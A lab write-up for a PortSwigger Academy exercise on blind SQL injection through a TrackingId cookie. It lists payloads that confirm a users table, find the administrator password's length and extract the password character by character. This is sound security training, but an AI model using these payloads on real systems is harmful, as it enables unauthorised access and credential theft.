# Lab: Blind SQL injection with conditional responses

**Official lab:** [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

## Lab idea

Practices blind SQLi assessment when a page changes based on whether a database condition matches. The exercise focuses on using a stable response difference to infer information without seeing query results.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, changing it to: TrackingId=xyz' AND '1'='1 Verify that the Welcome back message appears in the response.
3. Now change it to: TrackingId=xyz' AND '1'='2 Verify that the Welcome back message does not appear in the response.
4. Now change it to: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a Verify that the condition is true, confirming that there is a table called users .
- …
6. Launch the modified attack, review the results, and note the character at the second offset.
7. Continue this process testing offset 3, 4, and so on, until you have the whole password.
8. In the browser, click My account to open the login page.

## Payloads / key values
- `TrackingId`
- `TrackingId=xyz`
- `TrackingId=xyz' AND '1'='1`
- `Welcome back`
- `TrackingId=xyz' AND '1'='2`
- `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
- `users`
- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
- `administrator`
- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
- `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
- `SUBSTRING()`
- `a`
- `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
- `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`

## Official source
- [PortSwigger Academy: Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
